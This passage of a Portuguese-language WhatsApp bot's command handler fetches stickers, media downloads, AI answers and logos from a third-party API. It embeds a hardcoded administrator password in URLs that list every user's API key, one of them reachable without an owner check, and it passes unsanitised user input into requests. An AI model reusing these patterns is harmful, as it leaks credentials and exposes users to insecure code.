async function figu_raiva() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_raiva?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_raiva()
}
break

case 'figu_engracada':
case 'figu_engra√ßada':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas est√£o sendo enviadas em seu pv.`)
async function figu_engracada() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_engracada?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_engracada()
}
break

case 'figu_animal':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas est√£o sendo enviadas em seu pv.`)
async function figu_animal() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_animais?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_animal()
}
break

case 'figu_desenho':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas est√£o sendo enviadas em seu pv.`)
async function figu_desenho() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_desenho?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_desenho()
}
break

case 'figu_bebe':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas est√£o sendo enviadas em seu pv.`)
async function figu_bebe() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_bebe?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_bebe()
}
break

case 'figu_coreana':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas est√£o sendo enviadas em seu pv.`)
async function figu_coreana() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_coreana?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_coreana()
}
break

case 'figu_anime':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas est√£o sendo enviadas em seu pv.`)
async function figu_anime() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_anime?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_anime()
}
break

case 'figu_meme':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas est√£o sendo enviadas em seu pv.`)
async function figu_meme() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_memes?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_meme()
}
break

case 'figu_flork':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas est√£o sendo enviadas em seu pv.`)
async function figu_flork() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_flork?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_flork()
}
break


case 'figurinhas':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas est√£o sendo enviadas em seu pv.`)
async function figu_ale() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figurinhas_ale?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_ale()
}
break

case 'figu_bunda':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas est√£o sendo enviadas em seu pv.`)
async function figu_bunda() {
var rnd = Math.floor(Math.random() * 20)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_bunda?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_bunda()
}
break

case 'metadinha':
reagir(from, "üíñ") 
try {

let met = await fetchJson(`https://api.cariflex.xyz/random/metadinha`)

await amy.sendMessage(sender,
{image:
{url:met.masculina}
},
{quoted: info})

await amy.sendMessage(sender,
{image:
{url:met.feminina}
},
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break

case 'edit-sakura':
case 'edit-aleatorios':
case 'edit-bleach':
case 'edit-chain':
case 'edit-slayer':
case 'edit-dragon':
case 'edit-hunters':
case 'edit-kaisen':
case 'edit-naruto':
reagir(from, "üìΩ")
try {

await amy.sendMessage(from, 
{video: 
{url:`https://api.cariflex.xyz/api/editsvideo?categoria=${command}`} 
}, 
{quoted:info});

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break;


case 'imagemix':
if(!q) return reply(`Exemplo : ${prefix + command} üòÖ+ü§î`)
try {
let [emoji1, emoji2] = q.split`+`
var em = await getBuffer(`https://api.cariflex.xyz/api/outros/emojimix?emoji1=${encodeURIComponent(emoji1)}&emoji2=${encodeURIComponent(emoji2)}`)
await amy.sendMessage(from,
{image: em},
{quoted: info})
} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break

case 'playstore':
case 'Playstore':
amy.sendMessage(from, { react: { text: `üîé`, key: info.key }})
try {//By:  CRICIAN JS
dados = await fetchJson(`https://api.cariflex.xyz/api/playstore?nome=${q}`)
api = dados.pesquisa
amy.sendMessage(from, {image: {url: `${api.resultado[0].imagem}`}, 
caption: `*Nome* - ${api.resultado[0].nome}\n*Desenvolvedor* - ${api.resultado[0].desenvolvedor}\n*Estrelas* - ${api.resultado[0].estrelas}\n*Url* - ${api.resultado[0].link}
`}, {quoted: info})
} catch (error) {
reagir(from, "‚ùå")
}
break


case 'gpt-4': 
case 'gpt4':
    try {
        if (!q) return reply("Pergunta n√£o fornecida.");

        // URL atualizado com a consulta
        const url = `https://api.cariflex.xyz/api/ai/gpt?query=${encodeURIComponent(q)}&apikey=cariflex`;
        
        const anu1 = await fetchJson(url);
        
        // Verifica se a resposta √© v√°lida e envia
        if (anu1.resposta) {
            await amy.sendMessage(from, {text: anu1.resposta});
        } else {
            reply("Erro ao obter a resposta da API.");
        }
    } catch (e) {
        console.error("Erro:", e);
        reply("Erro ao processar solicita√ß√£o: " + e.message);
    }
    break;


case 'gpt': case'Gpt':
if (!q) return reply(`informe o nome da pesquisa`)
reply(` Obtendo Informa√ß√µes, Aguarde ${pushname}`)
try {// by ted
const url = `https://api.cariflex.xyz/api/ai/gpt?query=${encodeURIComponent(q)}&apikey=cariflex`;
api = await fetchJson(url)
await amy.sendMessage(from, {image: {url: `https://telegra.ph/file/150adfa5f55028be88a67.jpg`}, caption: `> ${api.resposta}`}, {quoted: info})
} catch (error) {
console.log(error)
}
break

case 'letra': case'Letra':
if (!q) return reply(`informe o nome da m√∫sica`)
reagir(from,`üîé`) 
try {
api = await fetchJson(`https://api.cariflex.xyz/api/pesquisa/letramusica?query=${q}`)
amy.sendMessage(from, {image: {url: `${api.resultado.image}`}, caption: `${api.resultado.titulo}\n${api.resultado.artista}\n${api.resultado.letra}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'nerding': case 'Nerding':
if (!q) return reply(`informe a seu t√≠tulo`)
reagir(from,`üîé`) 
try {//by CRICIAN  JS
nerd = await fetchJson(`https://api.cariflex.xyz/api/nerding?q=${q}`)
amy.sendMessage(from, {image: {url: `https://i.imgur.com/grB8Khl.jpeg`}, caption: `*TITULO*: ${nerd.resultado[0].titulo}\n*DESC*: ${nerd.resultado[0].desc}\n*URL*: ${nerd.resultado[0].link}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'serie': case 'Serie':
if (!q) return reply(`informe o nome da serie`)
reagir(from,`üîé`) 
try {
api = await fetchJson(`https://api.cariflex.xyz/api/serie?title=${q}`)
amy.sendMessage(from, {image: {url: `${api.resultado.poster}`}, caption:`TITULO: ${api.resultado.name}\nNOME-ORIGINAL: ${api.resultado.originalName}\nIDIOMA: ${api.resultado.language}\nADULTO: ${api.resultado.adult}\nDESCRI√á√ÉO: ${api.resultado.overview}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'dbkey': 
  if (!isCreator) return reply(msg.dono);
  
  fetch(`https://api.cariflex.xyz/database/lista-apikeys?senha=Adm_cricianxAdm_lana`)
    .then(response => response.json())
    .then(data => {
      let result = data.map((sr, index) => 
        `${index + 1} - ·¥Ä·¥ò…™·¥ã·¥á è: ${sr.apikey}\n Ä·¥á«´·¥ú·¥ás·¥õ: ${sr.request}\n\n`
      ).join('\n');
      
      let totalUsers = data.length;
      let finalMessage = `Cariflex possui ${totalUsers} usu√°rio(s).`;

      amy.sendMessage(sender, {text: `${result}\n${finalMessage}`});
    })
    .catch(error => console.error('Erro:', error));
  break;
  
case 'users': case 'usuarios':
   fetch(`https://api.cariflex.xyz/database/lista-apikeys?senha=Adm_cricianxAdm_lana`)
    .then(response => response.json())
    .then(data => {
      let result = data.map((sr, index) => 
        `${index + 1}`
      ).join('\n');
      
      let totalUsers = data.length;
      let finalMessage = `·¥Ñ·¥Ä Ä…™“ì ü·¥áx ·¥ò·¥èss·¥ú…™ ·¥Ä·¥õ·¥ú·¥Ä ü·¥ç·¥á…¥·¥õ·¥á ${totalUsers} ·¥ús·¥ú·¥ÄÃÅ Ä…™·¥ès.`;

      amy.sendMessage(from, {text:`${finalMessage}`},{quoted: info});
    })
    .catch(error => console.error('Erro:', error));
  break;
  
case 'pornolink': case'linkpor':
if (!q) return reply(`informe o link`)
reagir(from,`üîé`) 
try {
api = await fetchJson(`https://api.cariflex.xyz/api/xvideos?url=${q}&apikey=cariflex-key`)
amy.sendMessage(from, {text: `${api.resultado.video}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'Codificar': case 'codificar':
if (!q) return reply(`Coloque o texto para transformar em c√≥digo`)
reagir(from,`üîí`) 
try {
code = await fetchJson(`https://api.cariflex.xyz/api/outros/codificar?query=${q}`)
amy.sendMessage(from, {text: `${code.codificado}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'Decodificar': case 'decodificar':
if (!q) return reply(`Coloque o c√≥digo codificado para transformar em texto`)
reagir(from,`üîí`) 
try {
code = await fetchJson(`https://api.cariflex.xyz/api/outros/decodificar?query=${q}`)
amy.sendMessage(from, {text: `${code.decodificado}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break


case 'animefy':

try {

if(!q) return reply(`Digite um t√≠tulo para criar a imagem.`)
reagir(from, "üÜô")

let api = await fetchJson(`https://api.cariflex.xyz/api/ai/orbital-img?query=${q}&model=animefy`)

await amy.sendMessage(from, 
{image: 
{url:`${api.url}`}
},
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break;


case 'gemini': case'Gemini':
if (!q) return reply(`informe o nome da pesquisa`) 

try {
reply(`buscando a sua resposta`) 

const url = `https://api.cariflex.xyz/api/ia/gemini?query=${encodeURIComponent(q)}`

api = fetchJson(url)

amy.sendMessage(from,
{text: `> ${api.resposta}`},
{quoted: info})

} catch (e) {
console.log(e)
}
break

case 'info-celular': case 'celular':
if (!q) return reply(`informe o nome do celular`)
reagir(from,`üîé`) 
try {
api = await fetchJson(`https://api.cariflex.xyz/api/info_celular?celular=${q}`)
amy.sendMessage(from, {text: `NOME: ${api.resultado.nomeCelular}\nDESCRI√á√ÉO: ${api.resultado.resumoExtra}`}, {quoted: info})
break
} catch (error) {
console.log(e)
}
break

case 'cmd-audios': 
  //by crician js
  let comandosComAudio = estruturaDeComandos.filter(sr => sr.request.toLowerCase().includes('√°udio'));
  let totalaudio = comandosComAudio.length;
  let audios = `O bot possui ${totalaudio} comando que utilizam √°udio.`
 amy.sendMessage(from, {text: audios});
  break;

case 'voz':
 case 'Voz':
reagir(from, `üÜô`)
if(!q) return reply("Voc√™ esqueceu de digitar as palavras para transformar em √°udio.")
const crician = require('./arquivos/funcoes/gtts')('pt-br')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
crician.save(ranm, `${q}`, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
amy.sendMessage(from, {audio: fs.readFileSync(ranm), ptt:true, mimetype: "audio/mpeg"}, {quoted: info})
DLT_FL(ranm)
DLT_FL(rano)
})
})
break  

case 'amy':
 case 'Amy':
setTimeout(() => {reagir(from, `üÜô`)}, 100)
if(!q) return reply("Voc√™ esqueceu de perguntar ao lado do comando.")
nznk = await fetchJson(`https://api.zero-two.online/api/ia/gpt?query=${q}&apikey=`)
const gpts = require('./arquivos/funcoes/gtts')('pt-br')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
gpts.save(ranm, `${nznk.resultado}`, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
amy.sendMessage(from, {audio: fs.readFileSync(ranm), ptt:true, mimetype: "audio/mpeg"}, {quoted: info})
DLT_FL(ranm)
DLT_FL(rano)
})
})
break  
      
 case 'pensador': case 'Pensador':
if (!q) return reply(`informe o nome da pesquisa`)
reagir(from,`üîé`) 
try {
api = await fetchJson(`https://api.cariflex.xyz/search/pensador?query=${q}`)
amy.sendMessage(from, {image: {url: `https://i.imgur.com/MvFF0jm.jpeg`}, caption: `${api.resultado[0].frase}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'url':
    if (!q) return reply ("Envie o link de v√≠deo, √°udio ou imagem.")
  setTimeout(() => {reagir(from, `üÜô`)}, 100)  
    try {
        let res = await axios.get(q, { responseType: 'arraybuffer' }),
            ext = q.includes(".mp4") || q.includes("video") ? 'mp4' :
                  q.includes(".mp3") || q.includes("audio") ? 'mp3' :
                  (q.includes(".png") || q.includes(".jpg") || q.includes(".jpeg") || q.includes("image")) ? 'png' : null
        if (!ext) return reply("Arquivo inv√°lido. Verifique se o link cont√©m v√≠deo, √°udio ou imagem.")
        let fileName = `file_${Date.now()}.${ext}`
        fs.writeFileSync(fileName, res.data)
        let options = ext === 'mp4' ? { video: fs.readFileSync(fileName) } :
                      ext === 'mp3' ? { audio: fs.readFileSync(fileName), mimetype: 'audio/mp3', ptt: false } :
                      { image: fs.readFileSync(fileName) }
        await amy.sendMessage(info.key.remoteJid, options, { quoted: info })
        fs.unlinkSync(fileName);  
    } catch (error) {
        console.error(error);
        reply("Erro ao baixar o arquivo. Verifique o link e tente novamente.")
    }
    break//gozei


case 'glitch':
case 'write':
case 'advancedglow':
case 'typography':
case 'pixelglitch':
case 'neonglitch':
case 'flag':
case 'flag3d':
case 'deleting':
case 'blackpink':
case 'glowing':
case 'underwater':
case 'logomaker':
case 'cartoon':
case 'papercut':
case 'watercolor':
case 'effectclouds':
case 'blackpinklogo':
case 'gradient':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917':
case 'makingneon':
case 'royal':
case 'freecreate':
case 'galaxy':
case 'darkgreen':
case 'lighteffects': 
case 'dragonball':
case 'neondevil':
case 'frozen':
case 'wooden3d':
case 'metal3d':
case 'ligatures':
case '3druby':
case 'sunset':
case 'cemetery':
case 'halloween':
case 'horror':
case 'blood':
case 'joker':
case 'clouds':

textin = args.join(" ") 
if(!textin) return reply("Voc√™ precisa acrescentar um texto!")

try {

reply("estou gerando o seu logo com o t√≠tulo informado... ")

let logos = await getBuffer(`https://api.cariflex.xyz/api/logos/${command}?texto=${textin}`)

await amy.sendMessage(from, 
{image: logos}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break

case 'playmeme': case 'Playmeme':
if(!q) return reply(`Informe o titulo do meme`)
reagir(from, "üÜô")
amy.sendMessage(from, {audio: {url: `https://api.cariflex.xyz/api/audiomeme?query=${q}&apikey=cariflex`}, mimetype: "audio/mpeg"},{quoted: info}).catch(err => {
reagir(from, "‚ùå")
})
break 

case 'adolesc':
case 'vozmenino':  
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(`Aguarde um estante por favor`)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
DLT_FL(gem)
if(err) return reply('Ocorreu um erro ao adicionar o *efeito sonoro* no √°udio.')
hah = fs.readFileSync(ran)
amy.sendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: info})
DLT_FL(ran)
})
} else {
reply("Marque o √°udio..")
}
break  


case 'Mememp3': case 'mememp3':
if(!q) return reply(`*Informe o titulo*`)
reagir(from, "üÜô")
playmem = await fetchJson(`https://nodz.xyz/api/mememp3?query=${q}&apitoken=Rooh`)
amy.sendMessage(from, {audio: {url: `${playmem.resultado.link}`}, mimetype: "audio/mpeg"},{quoted: info}).catch(err => {
reagir(from, "‚ùå")
})
break 

//‚É§‚É§‚É§ ·¥Ñ·¥Äs·¥ás ·¥Ö·¥á ·¥ò ü·¥Ä è ·¥Ö·¥è  ô·¥è·¥õ  ‚É§‚É§‚É§

case 'playaudio':

reagir(from, "üÜô") 

if(!q) return reply(`exemplo ${prefix+command} mtg  na imagina√ß√£o`)

let api = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`)

await amy.sendMessage(from, {
    multimedia: [
        { image: { url: `${api.resultado[0].image}`}, caption: 'meu ovo 1' },
        { image: { url: `${api.resultado[0].image}`}, caption: 'meu ovo 2' }
    ]
});

await amy.sendMessage(from,
{audio: 
{url: `https://api.cariflex.xyz/api/downloads/youtube/mp3?url=${api.resultado[0].url}` },
mimetype: "audio/mpeg"},
{quoted: info})

break;

case 'play':
if(!q) return reply(`informe o nome da m√∫sica`)
try {
reagir (from, "üÜô") 

await amy.sendMessage(from,
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/youtube/play_audio?query=${q}`},
mimetype: "audio/mpeg"},
{quoted: info});

} catch (erro) {
reply("Nao foi poss√≠vel encontrar o audio da m√∫sica.")
console.log(erro)
}
break


case 'play2':
if(!q) return reply(`Exemplo: ${prefix}play nome da m√∫sica`)
try {

let play2 = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`);

reply(" Baixando o √°udio solicitado.. ")

await amy.sendMessage(from,
{audio://Crician JS desenvolvedor
{url:`https://api.cariflex.xyz/api/downloads/youtube/mp3-2?url=${play2.resultado[0].url}` },
fileName: play2.resultado[0].title + '.mpeg',
mimetype: "audio/mpeg",
contextInfo: {
externalAdReply: {
title: play2.resultado[0].title,
body: `‚åó ·¥Ñ·¥Ä Ä…™“ì ü·¥áx ·¥Ä ·¥ç·¥á ü ú·¥è Ä ‚åó`,
mediaType: 1,
reviewType: "PHOTO",
thumbnailUrl: play2.resultado[0].image,
showAdAttribution: true,
renderLargerThumbnail: true,
},
},
},
{quoted: info });
} catch (error) {
console.log(error) 
}
break

case 'play3':
if(!q) return reply(`nome da musica`)

reply(" Baixando o √°udio solicitado.. ")

let play3 = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`)

await amy.sendMessage(from,
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/youtube/mp3?url=${play3.resultado[0].url}`},
mimetype: "audio/mpeg",
headerType: 4,contextInfo: {
externalAdReply: {title: `${pushname}`,
body: `${play3.resultado[0].title}`,showAdAttribution: true,
thumbnail: await getBuffer(`${play3.resultado[0].image}`),
mediaType: 2,mediaUrl: `https://api.cariflex.xyz`,
sourceUrl: `https://api.cariflex.xyz`}}},{quoted: info}).catch(e => {
reply("Nao foi poss√≠vel encontrar o audio da m√∫sica.")
}) 
break

case 'play4':
try {
if (!q) return reply(`Exemplo: ${prefix + command} musica1 / musica2`);
    
let crician = q.split('/').map(item => item.trim()); 
if (crician.length < 2) return reply("Envie ao menos dois termos separados por /.");
    
let api1 = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${crician[0]}`);
let api2 = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${crician[1]}`);

reply(" Baixando os √°udios solicitado.. ")

await amy.sendMessage(from,
{audio://Crician JS desenvolvedor
{url:`https://api.cariflex.xyz/api/downloads/youtube/mp3-2?url=${api1.resultado[0].url}` },
fileName: api1.resultado[0].title + '.mpeg',
mimetype: "audio/mpeg",
contextInfo: {
externalAdReply: {
title: api1.resultado[0].title,
body: `‚åó ·¥Ñ·¥Ä Ä…™“ì ü·¥áx ·¥Ä ·¥ç·¥á ü ú·¥è Ä ‚åó`,
mediaType: 1,
reviewType: "PHOTO",
thumbnailUrl: api1.resultado[0].image,
showAdAttribution: true,
renderLargerThumbnail: true,
},
},
},
{quoted: info });

await amy.sendMessage(from,
{audio://Crician JS desenvolvedor
{url:`https://api.cariflex.xyz/api/downloads/youtube/mp3?url=${api2.resultado[0].url}` },
fileName: api2.resultado[0].title + '.mpeg',
mimetype: "audio/mpeg",
contextInfo: {
externalAdReply: {
title: api2.resultado[0].title,
body: `‚åó ·¥Ñ·¥Ä Ä…™“ì ü·¥áx ·¥Ä ·¥ç·¥á ü ú·¥è Ä ‚åó`,
mediaType: 1,
reviewType: "PHOTO",
thumbnailUrl: api2.resultado[0].image,
showAdAttribution: true,
renderLargerThumbnail: true,
},
},
},
{quoted: info });

} catch (error) {
console.log(error);
reply("Deu erro na solicita√ß√£o");
}
break;
 
case 'play5':
if(!q) return reply(`informe o nome da m√∫sica`)
reagir (from, "üÜô") 
try {

let api5 = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`)

ytbrt = `‚ùØ‚ùØ    BOT - DOWNLOAD   ‚ùÆ‚ùÆ
‚ùê Titulo: ${api5.resultado[0].title}
‚ùê Canal: ${api5.resultado[0].autor || "indefinido"}
‚ùê Dura√ß√£o: ${api5.resultado[0].seconds}
‚ùê Descri√ß√£o: ${api5.resultado[0].description}`

await amy.sendMessage(from,
{image: 
{url: `${api5.resultado[0].image}`}, 
caption: ytbrt},
{quoted: info})

await amy.sendMessage(from,
{audio: 
{url: `https://api.cariflex.xyz/api/downloads/youtube/mp3?url=${api5.resultado[0].url}` },
mimetype: "audio/mpeg"},
{quoted: info})

} catch (erro) {
reply("Nao foi poss√≠vel encontrar o audio da m√∫sica.")
console.log(erro)
}
break

case 'play6':
if(!q) return reply(`nome da musica`)
reagir(from, "üÜô") 
await sleep(300) 
music = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`)
await amy.sendMessage(from, { audio: { url: `https://api.cariflex.xyz/api/downloads/youtube/mp3?url=${music.resultado[0].url}` }, mimetype: "audio/mpeg",
headerType: 4,
contextInfo: {
externalAdReply: {
title: `${pushname}`,
body: `${music.resultado[0].title}`,
showAdAttribution: true,
thumbnail: await getBuffer(`https://i.imgur.com/LDFQyt2.jpeg`),
mediaType: 2,
mediaUrl: `https://api.cariflex.xyz`,
sourceUrl: `https://api.cariflex.xyz`}}},{quoted: info}).catch(e => {
reply("Nao foi poss√≠vel encontrar o audio da m√∫sica.")
})
break

case 'play7':
reagir(from, "üÜô")
if(!q) return reply(`Exemplo: ${prefix}play nome da m√∫sica`)

api = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`)

await amy.sendMessage(from,
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/youtube/mp3-2?url=${api.resultado[0].url}`},
mimetype: "audio/mpeg"}, 
{quoted: info}).catch(e => {
reagir(from, "‚ùå")
})
break

case 'playvideo':
if(!q) return reply('Cade o nome?');
await reagir(from, "üí´");

datinha = (await yts(q)).videos[0];
dir = await ytvdl(datinha.id);

try {
await amy.sendMessage(from,
{video: fs.readFileSync(dir), 
mimetype: 'video/mp4'}, 
{quoted: info});

} catch(e) {
if(String(e).includes('ENOSPC')) {
await reply(`Download finalizado, como o arquivo √© muito pesado irei reply em documento, aguarde.`)
try {
await amy.sendMessage(from,
{document: fs.readFileSync(dir),
mimetype: 'video/mp4',
fileName: `${datinha.title.text}.mp4`}, 
{quoted: info});
} catch(e) {
console.log(e);
await reply(`Ocorreu um erro ao reply o audio :/`);
}
} else {
console.log(e);
await reply(`Ocorreu um erro ao reply o audio :/`);
}
}
await cleanup(dir)
break

case 'play_video':
case 'Play_video':

try {

if(!q) return reply(`Coloque o nome do video`)

let api = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`)

await amy.sendMessage(from, 
{video: 
{url: `https://api.cariflex.xyz/api/downloads/youtube/mp4?url=${api.resultado[0].url}`},
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break

case 'videoall':

try {

if(!q) return reply(`Cade o link do video ?`)

await amy.sendMessage(from,
{video:
{url: `https://modulos.cariflex.xyz/api/downloads/alldl/mp4?url=${q}`}, 
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break

case 'audioall':
if(!q) return reply(`Cade o link do video ?`)
reagir(from, "üÜô")

await amy.sendMessage(from,
{audio:
{url: `https://modulos.cariflex.xyz/api/downloads/alldl/audio?url=${q}`}, 
mimetype: "audio/mpeg"}, 
{quoted: info}).catch(e => {
reagir(from, "‚ùå")
})
break

case 'ytmp4':

try {

if(!q) return reply(`Cade o link do video ?`)

reply(" Baixando o v√≠deo solicitado.. ") 

await amy.sendMessage(from,
{video:
{url: `https://api.cariflex.xyz/api/downloads/youtube/mp4-2?url=${q}`}, 
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break

case 'ytmp3':

try {

if(!q) return reply(`Cade o link do √°udio?`)

reply(" Baixando o √°udio solicitado.. ")

await amy.sendMessage(from, 
{audio: 
{url: `https://api.cariflex.xyz/api/downloads/youtube/mp3-2?url=${q}`}, 
mimetype: "audio/mpeg"},
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break 


case 'spotifymp3': 
case 'Spotifymp3': 
if(!q) return reply(`Cade o link do √°udio?`)
reagir(from, `üÜô`)

await amy.sendMessage(from,
{audio: 
{url: `https://api.cariflex.xyz/api/downloads/spotify/dl?url=${q}`}, 
mimetype: "audio/mpeg"},
{quoted: info}).catch(err => {
console.log(err)
reply("Ocorreu um erro")
})
break 

case 'drive_video':
case 'drivemp4':
if(!q) return reply(`cade o link do drive?`);
reagir(from, "üÜô");
try {

await amy.sendMessage(from, 
{video: 
{url: `https://api.cariflex.xyz/api/downloads/googledrive/mp4?url=${q}`}, 
mimetype: "video/mp4"}, 
{quoted: info})

} catch (e) {
reply("ocorreu um erro")
}
break;

case 'kwai_video':
case 'kwaimp4':
if(!q) return reply(`cade o link do kwai?`);
try {
reply("estou baixando o video")
await amy.sendMessage(from, 
{video: 
{url: `https://api.cariflex.xyz/api/downloads/kwai/mp4?url=${q}`}, 
mimetype: "video/mp4"}, 
{quoted: info})
} catch (e) {
reply("ocorreu um erro")
}
break;

case 'kwai_audio':
case 'kwaimp3':
if(!q) return reply(`cade o link do kwai?`);
try {
reply("estou baixando o audio")
await amy.sendMessage(from, 
{video: 
{url: `https://api.cariflex.xyz/api/downloads/kwai/mp3?url=${q}`}, 
mimetype: "audio/mpeg"}, 
{quoted: info})
} catch (e) {
reply("ocorreu um erro")
}
break;

case 'twitteri_video':
case 'twittermp4':
if(!q) return reply(`cade o link do twitter?`);
try {
reply("estou baixando o video")
await amy.sendMessage(from, 
{video: 
{url: `https://api.cariflex.xyz/api/downloads/twitter/mp4?url=${q}`}, 
mimetype: "video/mp4"}, 
{quoted: info})
} catch (e) {
reply("ocorreu um erro")
}
break;

case 'twitter_audio':
case 'twittermp3':

if(!q) return reply(`cade o link do twitter?`);

try {

reply("estou baixando o audio")

await amy.sendMessage(from, 
{video: 
{url: `https://api.cariflex.xyz/api/downloads/twitter/mp3?url=${q}`}, 
mimetype: "audio/mpeg"}, 
{quoted: info})

} catch (error) {
console.log(error)
